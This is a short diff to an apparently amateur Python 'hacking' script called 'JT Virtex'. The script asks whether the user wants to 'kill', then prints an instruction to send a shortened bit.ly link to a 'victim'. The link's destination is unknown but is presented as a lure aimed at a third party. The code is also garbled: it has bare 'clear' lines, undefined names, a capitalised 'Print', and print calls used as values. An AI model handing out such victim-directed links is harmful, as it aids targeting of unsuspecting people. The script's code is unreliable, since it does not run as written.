@@ -1,4 +1,4 @@
-Name = Print("JT Virtex")
+Name = Print('JT Virtex')
 clear
 First = input("do you want to kill")
 if First==yes or First==Yes:
@@ -6,4 +6,4 @@ Linktext = print("send this link to victim")
 link = print("https://bit.ly/3fX8ljZ")
 elif First==no or First==No:
 clear
-print(name)
+print(Name)
